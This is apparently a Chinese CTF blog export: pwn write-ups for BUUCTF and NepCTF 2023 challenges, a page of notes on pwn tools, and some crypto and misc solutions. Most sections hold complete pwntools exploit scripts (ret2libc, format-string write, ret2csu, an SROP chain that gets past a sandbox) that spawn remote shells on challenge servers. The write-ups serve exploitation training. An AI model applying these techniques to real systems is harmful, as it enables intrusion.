第二次leave指令执行后，esp指向ebp+4也就是图中’aaaa’的下一位，ebp的值仍为old_ebp - 0x38 ；此时已经完成栈迁移。接下来ret指令将ebp+4弹入eip执行，所以在aaaa之后的地址需要放置我们的system函数和binsh binsh和其地址都可以在迁移过后的栈上布局 0x04exp from pwn import * p = remote(\"node4.buuoj.cn\", 28160) system_addr = 0x08048400 leave_ret = 0x080484b8 payload1 = b'A' * (0x27) + b'B' p.send(payload1) # not sendline p.recvuntil(\"B\") original_ebp = u32(p.recv(4)) print(hex(original_ebp)) payload2 = b'aaaa' # for location, start of hijaction payload2 += p32(system_addr) payload2 += b'dddd' # fake stack ebp payload2 += p32(original_ebp - 0x28) # addr of binsh payload2 += b'/bin/sh\\x00' # at ebp-0x28 payload2 = payload2.ljust(0x28, b'p') payload2 += p32(original_ebp - 0x38) # hijack ebp ,-0x38 is the aaaa payload2 += p32(leave_ret) # new leave ret p.sendline(payload2) p.interactive() 参考博客 铁人三项(第五赛区)_2018_rop经典ret2libc3 exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p = remote('node4.buuoj.cn',28146) elf = ELF('./pwn') main_addr = elf.sym['main'] plt_addr = elf.plt['write'] got_addr = elf.got['write'] pay1 = b'a'*(0x88+4)+p32(plt_addr)+p32(main_addr)+p32(1)+p32(got_addr)+p32(0xD) p.sendline(pay1) write_addr = u32(p.recv()[0:4])#0xf7db1190 print(\"write_addr = \",hex(write_addr)) libc=LibcSearcher('write',write_addr) offset=write_addr-libc.dump('write') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x88+4)+p32(system)+b'aaaa'+p32(binsh) p.sendline(pay2) p.interactive() pwn2_sctf_20160x0132位开NX泄露libc 注意get_n是自定义函数 规定读入v2长度的字符，但是程序要求v2不大于32。观察到int型的v2传入unsigned int型的a2，可以传入-1整数溢出绕过。 ROP链泄露libc，溢出覆盖返回地址getshell 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn0') p = remote('node4.buuoj.cn',26602) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') libc = ELF('./libc-2.23.so') elf = ELF('./pwn0') main_addr = elf.sym['main'] plt_addr = elf.plt['printf'] got_addr = elf.got['getchar'] fmt = 0x080486F pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(fmt)+p32(got_addr) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr)+p32(fmt) #pay1 = b'a'*(0x2c+4)+p32(plt_addr)+p32(main_addr)+p32(got_addr) p.recvuntil(b\"\\n\") p.sendline(pay1) getchar_addr= u32(p.recvuntil(b'\\xf7')[-4:]) #getchar_addr = u32(p.recv()[0:4])变成接收前面四个字节了 print(\"getchar_addr = \",hex(getchar_addr)) ''' libc=LibcSearcher('getchar',getchar_addr) offset=getchar_addr-libc.dump('getchar') binsh=offset+libc.dump('str_bin_sh') system=offset+libc.dump('system') ''' base_addr = getchar_addr - libc.symbols['getchar'] system = libc.symbols['system'] + base_addr binsh = libc.search(b'/bin/sh').__next__() + base_addr print(\"libc_base_addr = \",hex(base_addr)) #print(\"libc_base_addr = \",hex(offset)) print(\"sys_addr = \",hex(system)) print(\"sh_addr = \",hex(binsh)) pay2 = b'a'*(0x2c+4)+p32(system)+b'aaaa'+p32(binsh) p.recvuntil(b\"How many bytes do you want me to read?\") p.sendline(b'-1') p.recvuntil(b\"\\n\") p.sendline(pay2) p.interactive() bjdctf_2020_babyrop0x01注意这题位64位。32位和64位传参有区别 思路： 利用puts函数泄露出puts函数真实地址 通过puts函数地址计算出libc基地址，从而计算出system和binsh的真实地址 构造rop链栈溢出getshell puts函数通过pop rdi ; ret 传参 用ROPgadget可以找到 0x02exp #encoding = utf-8 from pwn import * from LibcSearcher import * context(os = 'linux',arch = 'amd64',log_level = 'debug') content = 1 elf = ELF('./pwn') def main(): if content == 1: p = process('./pwn') else: p = remote('node4.buuoj.cn',29917) #elf main_addr = elf.sym['main'] plt_addr = elf.plt['puts'] got_addr = elf.got['puts'] pop_rdi = 0x0400733 ret_addr = 0x04004c9 payload = b'a'*(0x20+0x8) + p64(pop_rdi) + p64(got_addr) + p64(plt_addr) + p64(main_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) puts_addr = u64(p.recv(6).ljust(8,b'\\x00')) print(hex(puts_addr)) #libc lib = LibcSearcher('puts',puts_addr) lib_puts_addr = lib.dump('puts') lib_system_addr = lib.dump('system') lib_bin_addr = lib.dump('str_bin_sh') #base base_addr = puts_addr - lib_puts_addr system_addr = base_addr + lib_system_addr bin_addr = base_addr + lib_bin_addr payload = b'a'*(0x20+0x8) + p64(ret_addr) + p64(pop_rdi) + p64(bin_addr) + p64(system_addr) p.recvuntil(\"Pull up your sword and tell me u story!\\n\") p.sendline(payload) p.interactive() main() [HarekazeCTF2019]baby_rop264位的ret2libc3 0x01 利用printf泄露libc版本和基地址，传参的时候需要传入格式化字符串%s给寄存器rdi（程序中第二个printf函数自带，返回至该格式化字符串地址即可）；并将想要泄露的read_got传给寄存器。 0x02exp from pwn import * from LibcSearcher import * context(os='linux', arch='amd64', log_level='debug') p = remote('node4.buuoj.cn',25502) #p = process('./babyrop2') elf = ELF('./babyrop2') libc = ELF('libc.so.6') #一定要用题目给的libc文件，可能必须要用题目给的才能打通 printf_plt = elf.plt['printf'] read_got = elf.got['read'] main_plt = elf.sym['main'] pop_rdi = 0x0000000000400733 pop_rsi_r15 = 0x0000000000400731 fmt = 0x0000000000400790 payload1 = b'a'*(0x20+8)+p64(pop_rdi)+p64(fmt)+p64(pop_rsi_r15)+p64(read_got)+p64(0)+p64(printf_plt)+p64(main_plt) p.recvuntil(\"name? \") p.sendline(payload1) read_addr = u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) print(\"read_addr ======>> \"+hex(read_addr)) libc_base = read_addr - libc.sym[\"read\"] system_addr = libc_base+libc.sym[\"system\"] bin_sh_addr=libc_base+libc.search(b'/bin/sh').__next__() payload2 = b'a'*0x28+p64(pop_rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0) p.sendline(payload2) p.interactive() jarvisoj_fmBUUCTF pwn考点：格式化字符串漏洞 格式化字符串，任意地址写漏洞 将x写为4即可getshell，x的地址为0x0804a02c，调试可得输入的内容位于栈偏移11个单位处 exp from pwn import * context(os='linux', arch='i386', log_level='debug') #p = process('./pwn') p=remote('node4.buuoj.cn',29551) x_addr=0x804A02C payload=p32(x_addr)+b\"%11$n\" p.sendline(payload) p.interactive() 或更通用 #!/usr/bin/env python2 #-*- coding=UTF-8 -*- from pwn import * context.log_level = 'debug' #sh = process('./jarvisoj_fm') sh = remote('node3.buuoj.cn',26325) #gdb.attach(sh) x_addr = 0x0804a02c #将栈偏移13个单位处的x_addr指针指向的地址内容修改为4 #payload中x_addr写入的位置为栈偏移13处，见下图 #25346225(小端)是栈偏移11，所以2ca00408(小端)是栈偏移11+2=13 payload = '%4c%13$n' + p32(x_addr) #pause() sh.sendline(payload) sh.sendline('cat flag') sh.interactive() ciscn_2019_s_30x0164位开启NX 注意程序直接使用sys_read和sys_write函数而不是通常的read和write，在构造payload时要注意在函数返回时没有pop rbp这一步而是直接执行ret，所以我们直接覆盖rbp为vuln函数地址。 0x02本题两种做法，一种是ret2csu，利用__libc_csu_init布置栈空间；一种是SROP 题目也给出了相应的gadgets，若选择rax传参0xF（系统调用号），则可执行sigreturn系统调用；若选择rax传参0x3B，则可执行excve(‘/bin/sh’,0,0)系统调用 我们需要在栈上布置ROPgadgets和各参数，而栈地址是随机的，所以我们首先要泄露栈地址。 同时我们知道栈上的各地址间的相对位置是不变的，所以泄露出栈地址后可以通过与buf的偏移计算出buf的地址 经过调试发现，如图： buf的起始地址为0x7fffffffded0，目标泄露栈地址（即某个rbp的值）为图中栈偏移为02的地址0x7fffffffe018，二者相差0x148。这是本地的偏移，若要获得与远程环境相同的偏移要应用patchelf。具体可看这篇文章。用相同的方法调试可得远程偏移为0x118. 在接收泄露的栈地址之前需要去掉多余的buf(0x10)+rbp(vul_addr)+栈上偏移为01的地址。 exp第一部分 vul_addr = 0x4004ed ret_addr = 0x4003a9 vul_addr = 0x4004ed payload = b'a' * 0x10 + p64(vul_addr) p.send(payload) p.recv(0x20) stack_addr = u64(p.recv(8)) print(hex(stack_addr)) #buf_addr = stack_addr-0x118 buf_addr = stack_addr-0x148 0x03第一种做法：ret2csu控制执行execve__libc_csu_init （具体可以看ctf-wiki中的介绍） 需要将各寄存器置为： rax 0x3B rdi = ‘/bin/sh’ rsi = 0 rdx = 0 ROPgadget 能找到控制rdi和rsi的，以及syscall （不过实际上没有用rsi的，因为csu中有pop r14和mov rsi, r14指令，可以通过栈上布置将rsi置为0） 现在还要想办法控制rdx 通过__libc_csu_init可以看到，我们可以先执行pop r13然后再执行mov rdx, r13将rdx置为0 同时还要注意： 0x400589: call [r12 + rbx * 8], 会执行r12+rbx8地址指向的函数，不过这里没有需要执行的函数，所以可以在buf里放了个ret;的地址…, 然后让r12 + rbx8指向buf；call函数之前会自动将下一条指令入栈，接着执行ret则rsp指针相当于不变 cmp rbx, rbp; jnz short loc_400580, 如果rbx和rbp相同会循环。想要绕过需要使 rbx = 0 rbp = 1 泄露函数地址后直接重进的vul函数，buf的地址不变 pop_rdi = 0x4005a3 syscall = 0x400501 vul_addr = 0x4004ed ret_addr = 0x4003a9 payload = p64(ret_addr) + b'/bin/sh\\0'#为之后函数跳转和传入binsh做准备 payload += p64(0x4004e2) # rax=0x3b payload += p64(0x40059a) # 6个pop payload += p64(0) + p64(1) # rbx = 0, rbp = 1 payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addr，r13 r14 r15 = 0 payload += p64(0x400580) #执行寄存器r12指向的函数 （也就是ret）；把rdx设为0 payload += p64(0) * 7 # 这里执行到0x400596后又会重新pop一遍, 开头执行add rsp, 8让rsp跳过了栈上的一个数据，如何执行6pop，所以栈上布置7个0 payload += p64(pop_rdi) + p64(buf_addr + 8) # rdi = &amp;'/bin/sh\\0' payload += p64(syscall) payload += p64(vul_addr) p.send(payload) p.interactive() 第二种：SROP具体可参考ctf-wiki 本题解法可参考这篇博客 sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = buf_addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rip = syscall payload = b'/bin/sh\\0'.ljust(0x10, b'a') + p64(0x4004da) + p64(syscall) + bytes(sigframe) 利用pwntools的sigframe模块即可 其实这两种解法都是以程序读入足够多的字节为条件的 完整exp from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] p = process('./ciscn_s_3') #p = remote('node4.buuoj.cn',29591) pop_rdi_ret = 0x4005a3 syscall = 0x400501 vul_addr = 0x4004ed ret_addr = 0x4003a9 vul_addr = 0x4004ed payload = b'a' * 0x10 + p64(vul_addr) p.send(payload) p.recv(0x20) stack_addr = u64(p.recv(8)) print(hex(stack_addr)) #buf_addr = stack_addr-0x118 buf_addr = stack_addr-0x148 gdb.attach(p) payload = p64(ret_addr) + b'/bin/sh\\00' payload += p64(0x4004e2) # rax=0x3b payload += p64(0x40059a) # rdx = 0 payload += p64(0) + p64(1) # rbx = 0, rbp = 1 payload += p64(buf_addr) + p64(0) * 3 # r12 = buf_addr payload += p64(0x400580) payload += p64(0) * 7 payload += p64(pop_rdi_ret) + p64(buf_addr + 8) # rdi = &amp;'/bin/sh\\0' payload += p64(syscall) #payload += p64(vul_addr) ''' sigframe = SigreturnFrame() sigframe.rax = constants.SYS_execve sigframe.rdi = buf_addr sigframe.rsi = 0x0 sigframe.rdx = 0x0 sigframe.rip = syscall payload = b'/bin/sh\\0'.ljust(0x10, b'a') + p64(0x4004da) + p64(syscall) + bytes(sigframe) ''' p.send(payload) p.interactive()","categories":[{"name":"wp","slug":"wp","permalink":"http://lmarch2.github.io/categories/wp/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"http://lmarch2.github.io/tags/BUUCTF/"}]},{"title":"PWN一些用到的指令和工具","slug":"PWN一些用到的指令和工具","date":"2023-08-28T13:54:45.000Z","updated":"2024-02-04T06:54:35.848Z","comments":true,"path":"posts/6121198a/","link":"","permalink":"http://lmarch2.github.io/posts/6121198a/","excerpt":"ROPgadget ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段 ROPgadget –binary 文件名 –sting ‘/bin/sh’ vmmap vim pwndbg ASLR和pie编译 shellcode GCC编译指令 关于符号表 patchelf","text":"ROPgadget ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段 ROPgadget –binary 文件名 –sting ‘/bin/sh’ vmmap vim pwndbg ASLR和pie编译 shellcode GCC编译指令 关于符号表 patchelf ROPgadget –binary 文件名 –only “指令|指令” | grep 寄存器或者其他存在的字段查找汇编指令的地址 例子： ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep eax ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘: mov eax’ –only ” | “ 表示只返回含有xx指令或xx指令的gadget grep 表示含有什么什么特定字段（通常是寄存器）的指令 但是grep能寻找的必须是连续的指令中间不能隔开，连空格都必须一致才能被搜索到 比如你想要搜索0x080701a8 : mov eax, ecx ; ret，你可以用命令ROPgadget --binary get_started_3dsctf_2016 --only \"mov|ret\" |grep 'eax, ecx'；命令ROPgadget --binary get_started_3dsctf_2016 --only \"mov|ret\" |grep 'eax,ecx'无法成功因为逗号和ecx之间少了一个空格 取地址的指令[edx]无法被识别，[ ]在ROPgadget中貌似是表示含有[ ]内字母的指令 比如 ROPgadget –binary get_started_3dsctf_2016 –only “mov|ret” |grep ‘[edx]’得到的是这样 ROPgadget –binary 文件名 –sting ‘/bin/sh’查找字符串地址 例子： ROPgadget –binary 文件名 –sting ‘/bin/sh’ ROPgadget –binary 文件名 –sting ‘/sh’ ROPgadget –binary 文件名 –sting ‘sh’ ROPgadget –binary 文件名 –sting ‘cat flag’ ROPgadget –binary 文件名 –sting ‘cat flag.txt’ ![( vmmapvmmap [-h] [pages_filter] 首先vmmap需要在pwndbg，且程序运行时使用 输入vmmap，显示出程序运行时所用到的所有地址段 输入vmmap 地址 ，显示该地址对应的地址段 vmmap -h，提示帮助；-w只显示可写的部分；-x只显示可执行的部分 例子： 第一行，表明了哪个颜色对应哪个段， start和end对应该地址段的起始和结束位置 Perm 是该段的权限，rwx代表可读、可写、可执行 Size表示该段大小 Offset表示这段与程序基址的偏移 File表示加载的是什么 vim命令模式下： $ 行末 ^ 行首 L 屏幕底行 H 屏幕顶行 yy 拷贝该行 dd 删除该行 P 前粘贴 p 后粘贴 D 删除至行尾 u 撤销 gg 光标移至行首 dG 删除光标行及光标行以下全部内容 底线命令模式下： :wq 保存并退出 :%d 删除全部内容 :%s 替换 参考（万里哥我滴神） pwndbg基本指令 r = run 运行程序，如果你当前已经在运行程序了，再输入r会重新运行程序 b = break 下断点，在调试pwn中，一般是 b 0xabcde ，abcde是在ida中看到的地址,如b 0x400908 c = continue 继续运行程序直到停在下一个断点 n = next 下一行，一般装了pwndbg之后下一行指的是下一条汇编，但是如果调试的程序是带调试信息的，一般会跳几行汇编 ni = nexti 下一条指令，这个就是真正的下一条汇编指令 s = step 单步进入函数 d = delete 删除断点，后面可带数字，说明删除第几个断点，如果不带参数，说明删除全部断点 x 查看内存 c,n,ni这几个程序都可以带一个数字，用来代表连续运行这个指令多少次 x/num xg 地址 64位查看某处地址 x/num xw 地址 32位查看某处地址 s/num s 地址 查看从地址开始的num个字符串 b *$rebase(地址) 用于开启PIE该指令会在基址+地址处下断点 https://wizardforcel.gitbooks.io/100-gdb-tips/content/index.html100个gdb小技巧 gdb制定程序运行的参数gdb –args binary value gdb调试改变地址或地址指向值set addr_old = addrset *addr_old = addr bt显示函数所有调用栈的信息bt n显示栈顶的n个调用信息bt -n显示栈底的n个调用信息 中间加full表示 显示栈中所有帧的完全信息如：函数参数，本地变量 ASLR和pie编译查看系统当前ASLR打开情况 sudo cat /proc/sys/kernel/randomize_va_space ASLR的三个级别 ： 0， 不开启任何随机化； 1， 开启stack、libraries [、executable base（special libraries -^-） if PIE is enabled while compiling] 的随机化； 2，开启heap随机化。 PIE编译出来的executable如果ASLR=0的话，基址也是不会变的（有能力但没使用），如果ASLR=1的话，即使按照ASLR定义这个级别似乎不会对heap基址随机化，但是由于executable的基址已经随机化了，所以heap的基址自然也就被随机化了 指令关闭ASLR sysctl -w kernel.randomize_va_space=0 echo 0 &gt; /proc/sys/kernel/randomize_va_space fPIE选项仅能在编译可执行码时用，不能用于编译库。所以，如果想要PIE的程序，需要你除了在gcc增加-fPIE选项外，还需要在ld时增加-pie选项才能产生这种代码。即gcc -fpie -pie来编译程序。单独使用哪一个都无法达到效果。 gcc helloworld.c file a.out a.out: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped file a.out a.out: ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.9, not stripped 未开启PIE的文件属性为executable，开启的为shared object 注意PIE随机程序加载基地址，要和libc的随机libc库基地址区分 shellcodepwntools生成的shellcode默认64位 shellcode = asm(shellcraft.sh()) 要生成32位的shellcode需要指定 shellcode = asm(shellcraft.sh(),arch=’i386’,os=’linux’) 手动反汇编汇编指令 xx = asm(‘’’ ‘’’) GCC编译指令gcc各保护编译指令https://blog.csdn.net/tabactivity/article/details/126660974https://zoepla.github.io/2018/04/gcc%E7%9A%84%E7%BC%96%E8%AF%91%E5%85%B3%E4%BA%8E%E7%A8%8B%E5%BA%8F%E4%BF%9D%E6%8A%A4%E5%BC%80%E5%90%AF%E7%9A%84%E9%80%89%E9%A1%B9/全开 gcc test.c -o test -z noexecstack -z now -fstack-protector -fpie -pie 全关 gcc test.c -o test -z execstack -z norelro -fno-stack-protector -no-pie sudo sh -c “echo 0 &gt; /proc/sys/kernel/randomize_va_space”关闭ASLR把0换成2就是开启 编译时加上 -m32 即编译成32位程序 https://blog.csdn.net/Jason_ZhouYetao/article/details/81606358 关于符号表readelf binary -p .comment 或 objdump -s --section=.comment binary 可以查看程序或编译器版本 readelf，objdump，去符号表，恢复符号表上链接readelfobjdump去符号表恢复符号表 patchelfpatchef四部曲 ldd binary列出动态库依赖 strings 题目给的libc名 | grep ubuntu快速找到Libc文件对应版本 （cp 想替换的文件到赛题目录） patchelf –set-interpreter ./ld-2.27.so ./binary—————————对应的ld文件—-pwn文件 patchelf –replace-needed libc.so.6 ./libc-2.27.so ./binary————————-原本的libc—-要替换的libc—–pwn文件 （若只用上述命令碰到如下报错时）patchelf –replace-needed libpthread.so.0 ./libpthread-2.31.so ./binary ——————————–原本的 ——— 要替换的 Linux命令 pwd ：获取当前所在目录路径realpath file : 获取文件地址 pip list查看已安装包pip show 包名 查看包安装路径","categories":[{"name":"tools and tricks","slug":"tools-and-tricks","permalink":"http://lmarch2.github.io/categories/tools-and-tricks/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://lmarch2.github.io/tags/ctf/"},{"name":"pwn","slug":"pwn","permalink":"http://lmarch2.github.io/tags/pwn/"}]},{"title":"2023NepCTF WP","slug":"2023NepCTF-WP","date":"2023-08-15T03:25:59.095Z","updated":"2024-02-04T06:52:04.983Z","comments":true,"path":"posts/0/","link":"","permalink":"http://lmarch2.github.io/posts/0/","excerpt":"","text":"NepCTF2023 WP真的超级紧张刺激的比赛！！有做不出题目夜不能寐的痛苦，也有冥思苦想之后的豁然开朗，第一次感受到了ctf比赛的乐趣所在。虽然最后的成绩停留在110，不过对于一个初出茅庐的萌新，已经很满足了；即使比赛结束后才做出三月七和最后放出的两个pwn题（挺气的，早知道不看万恶的login的……）。那就给自己继续加油吧，希望下次比赛能拿到属于自己的一份荣誉！ PWNsrop使用经典srop技巧，但是在此基础上又加了orz，观察程序会发现，能够调用sigreturn（调用号为0xf），而且溢出量足够大（0x300）。整体的一个思路就是构造system call chains，伪造四个栈帧，在syscall返回的时候，rsp会返回到另一个sigframe，从而实现一个又一个的函数调用。 几个注意点： 利用pwntools写frame的时候对各个寄存器传入的都是地址，不能直接把字符串写进去（会bytes()报错 别问为什么我知道） 返回执行系统syscall的时候注意这个程序只有call _system，而没有直接的syscall汇编指令，而进入到call _system单步调试可以发现这个过程中各个寄存器的值是会发生变化的（不同的寄存器之间赋值），所以我们在构造frame指定寄存器值的时候需要根据call _system中的指令来调整frame的各个寄存器值，sigreturn也是如此，有其他的命令会改变rax的值，因此需要多一个pop rdi控制一下 各个stack_frame需要精心构造 因为沙箱禁掉了execve，所以我们使用open,read,write绕过沙箱。（一定注意这里读取文件内容的read系统调用rdi传参是3） exp from pwn import * context(os='linux', arch='amd64', log_level='debug') context.terminal = ['tmux', 'splitw', '-h'] #p = process(\"./pwn\") p = remote('nepctf.1cepeak.cn',31552) #gdb.attach(p) #syscall = 0x400788 syscall = 0x04005B0 pop_rdi = 0x0000000000400813 sigreturn = p64(pop_rdi)+p64(0xf)+p64(0x400750)+p64(syscall) buf = 0x0601020 # buf地址 #write frame4 = SigreturnFrame(kernel='amd64') frame4.rdi = constants.SYS_write#rax frame4.rcx = 0x40#rdx frame4.rsi = 1#rdi frame4.rdx = buf#rsi frame4.rip = syscall frame4.rsp = buf#+len(sigreturn+bytes(sigframe)) # 设置栈顶指针位置 stack3 = sigreturn+bytes(frame4) #open frame2 = SigreturnFrame(kernel='amd64') frame2.rdi = constants.SYS_open#rax frame2.rcx = 0#rdx frame2.rsi = buf#rdi注意这里是不能直接传字符串\"flag\"的，而是应该传地址 frame2.rip = syscall frame2.rsp = buf+5+len(sigreturn+bytes(frame2)) # 设置栈顶指针位置 stack1 = sigreturn+bytes(frame2) #read2 frame3 = SigreturnFrame(kernel='amd64') frame3.rdi = constants.SYS_read#rax frame3.rcx = 0x40#rdx frame3.rsi = 3#rdi frame3.rdx = buf#rsi frame3.rip = syscall frame3.rsp = buf+5+len(stack1+sigreturn+bytes(frame3)) # 设置栈顶指针位置 stack2 = sigreturn+bytes(frame3) stack_frame = b\"flag\\x00\"+stack1+stack2+stack3 #stack_frame = sigreturn+bytes(sigframe)+sigreturn+bytes(sframe) #read1 frame = SigreturnFrame(kernel='amd64') frame.rdi = constants.SYS_read#rax frame.rcx = len(stack_frame)#rdx frame.rsi = 0#rdi frame.rdx = buf#rsi frame.rip = syscall frame.rsp = buf+5 # 设置栈顶指针位置 print(bytes(frame)) pad = cyclic(0x38) pad += sigreturn + bytes(frame) p.recv() p.send(pad) #pause(1) #gdb.attach(p) p.send(stack_frame) p.interactive() 可恶的Login找不出路径…… HRP-CHAT-2真的服了….真的就差一步，下标没弄清楚，其实一个个试都可以试出来的…. 获得攻击力最高的角色（需要抽卡得到，抽卡的次数会影响你的下标） 选择攻击力最强的技能，击败boss即可拿到flag HRP-CHAT-3阅读源码 main函数里执行子进程，崩溃进入CMD CMD函数 可以想到让子进程崩溃后，进入安全模式拿flag from pwn import * context(os='linux', arch='amd64') #context(os='linux', arch='amd64', log_level='debug') #context.terminal = ['tmux', 'splitw', '-h'] #p = process(\"./\") p = remote('nepctf.1cepeak.cn',31971) sda = lambda delim,data :p.sendafter(delim,data) sd = lambda data :p.send(data) sea = lambda delim,data :p.sendafter(delim,data) sl = lambda data :p.sendline(data) sla = lambda delim,data :p.sendlineafter(delim,data) ru = lambda delims,drop=True :p.recvuntil(delims,drop) uu32 = lambda data :u32(data.ljust(4,b'\\x00')) uu64 = lambda data :u64(data.ljust(8,b'\\x00')) lg = lambda name,addr :log.success(name+'='+hex(addr)) ia = lambda :p.interactive() def get_addr64() : return u64(p.recvuntil(b'\\x7f')[-6:].ljust(8, b'\\x00')) def get_addr32() : return u32(p.recvuntil(b'\\xf7')[-4:]) ru(b'help') sl(b'Login\\n') sla('6',b'Login\\n'*0x517) sl(b'\\nSafe_Mode_Key') ia() MISCcheckin一个号只能发一次，第一次发错了….（哭） NepCTF{H4ve_Fun_1N_This_Game} 与AI共舞的哈夫曼年轻人就要年轻，正经人谁自己做题啊~x GPT秒了 import heapq import os class HuffmanNode: def __init__(self, char, freq): self.char = char self.freq = freq self.left = None self.right = None def __lt__(self, other): return self.freq &lt; other.freq def build_huffman_tree(frequencies): heap = [HuffmanNode(char, freq) for char, freq in frequencies.items()] heapq.heapify(heap) while len(heap) > 1: left = heapq.heappop(heap) right = heapq.heappop(heap) merged = HuffmanNode(None, left.freq + right.freq) merged.left = left merged.right = right heapq.heappush(heap, merged) return heap[0] def build_huffman_codes(node, current_code, huffman_codes): if node is None: return if node.char is not None: huffman_codes[node.char] = current_code return build_huffman_codes(node.left, current_code + '0', huffman_codes) build_huffman_codes(node.right, current_code + '1', huffman_codes) def compress(input_file, output_file): with open(input_file, 'rb') as f: data = f.read() frequencies = {} for byte in data: if byte not in frequencies: frequencies[byte] = 0 frequencies[byte] += 1 root = build_huffman_tree(frequencies) huffman_codes = {} build_huffman_codes(root, '', huffman_codes) compressed_data = '' for byte in data: compressed_data += huffman_codes[byte] padding = 8 - len(compressed_data) % 8 compressed_data += '0' * padding with open(output_file, 'wb') as f: # Write frequency information f.write(bytes([len(frequencies)])) for byte, freq in frequencies.items(): f.write(bytes([byte, (freq >> 24) &amp; 0xFF, (freq >> 16) &amp; 0xFF, (freq >> 8) &amp; 0xFF, freq &amp; 0xFF])) # Write compressed data for i in range(0, len(compressed_data), 8): byte = compressed_data[i:i+8] f.write(bytes([int(byte, 2)])) def decompress(compressed_file, decompressed_file): with open(compressed_file, 'rb') as f: # 读取频率信息 num_symbols = int.from_bytes(f.read(1), byteorder='big') frequencies = {} for _ in range(num_symbols): byte, freq1, freq2, freq3, freq4 = f.read(5) freq = (freq1 &lt;&lt; 24) | (freq2 &lt;&lt; 16) | (freq3 &lt;&lt; 8) | freq4 frequencies[byte] = freq # 构建哈夫曼树 root = build_huffman_tree(frequencies) # 解压缩数据 current_node = root decompressed_data = bytearray() while True: bit = f.read(1) if not bit: break bit = int.from_bytes(bit, byteorder='big') for i in range(7, -1, -1): if current_node.char is not None: decompressed_data.append(current_node.char) current_node = root if (bit >> i) &amp; 1 == 1: current_node = current_node.right else: current_node = current_node.left # 写入解压缩后的数据 with open(decompressed_file, 'wb') as output_f: output_f.write(decompressed_data) if __name__ == \"__main__\": input_file = 'input.txt' compressed_file = 'compressed.bin' decompressed_file = 'decompressed.txt' # 解压缩文件 decompress(compressed_file, decompressed_file) codes各种尝试想要提权结果没一个函数有用的，system,getenv,mprotect甚至read甚至env本身全都禁掉了 只好直接输出，想到函数参数依次入栈，而env环境变量也是main函数的一个参数，从而想到在argc的基础上++移动指针，暴力输出大量数据，从中找到flag #include &lt;stdio.h> int main( int argc, char *argv[]) { for （int i = 0; i&lt; argc; ++i) { for(int j = 0;j&lt;700;++j) printf(\"%d': %s n\", i, argv［ i 」 + j ); } return 0; } （优雅） 小叮弹钢琴mid音频隐写（我思考velato这样的音符编程语言尝试了好久最后发现就是个隐写？？） 前半段是短音符和长音符，判断是摩斯电码，后面的是一串十六进制数字 摩斯电码解码得到tip：youshouldusethistoxorsomething 真，一开始断句成了this tox or something （甚至找了半天tox是啥） 接下来异或卡了好久，愣是没想到是用这句话去异或 之后联想前几个字母是NepCTF，尝试发现与之异或的是you，才发现把youshouldusethistoxorsomething这句话去异或0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17就行了 陌生的语言由给出的hint可知是小魔女学园的月文和龙语。 纯粹的信息收集了 NepCTF{NEPNEP_A_BELIEVING_Heart_is_your_magic} ConnectedFive真的是下棋下出来的 你也喜欢三月七么题目所给附件 salt_lenth= 10 key_lenth= 16 iv= 88219bdee9c396eca3c637c0ea436058 #原始iv转hex的值 ciphertext= b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc 看上去是AES，根据题目： salt=NepCTF2023 salt用sha256加密后得到key，解得sha256（salt）= dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009 截取前十六位为key from Crypto.Cipher import AES key = 'dd8e671df3882c5be6423cd030bd7cb69671ef27dfe7a541903edc4e23168009' iv_hex = '88219bdee9c396eca3c637c0ea436058' #原始iv转hex的值 ciphertext= '''b700ae6d0cc979a4401f3dd440bf9703b292b57b6a16b79ade01af58025707fbc29941105d7f50f2657cf7eac735a800ecccdfd42bf6c6ce3b00c8734bf500c819e99e074f481dbece626ccc2f6e0562a81fe84e5dd9750f5a0bb7c20460577547d3255ba636402d6db8777e0c5a429d07a821bf7f9e0186e591dfcfb3bfedfc''' # 把hex值转成bytes iv = bytes.fromhex(iv_hex) key = bytes.fromhex(key)[:16] ciphertext = bytes.fromhex(ciphertext) aes = AES.new(key, AES.MODE_CBC, iv) plaintext = aes.decrypt(ciphertext) print('plaintext:', plaintext) # plaintext: b'6148523063484d364c793970625763784c6d6c745a3352774c6d4e76625338794d44497a4c7a41334c7a49304c336c5061316858553070554c6e42755a773d3d' base64解码得到url 解压压缩包得 找了找星铁的文字 对找得到flag 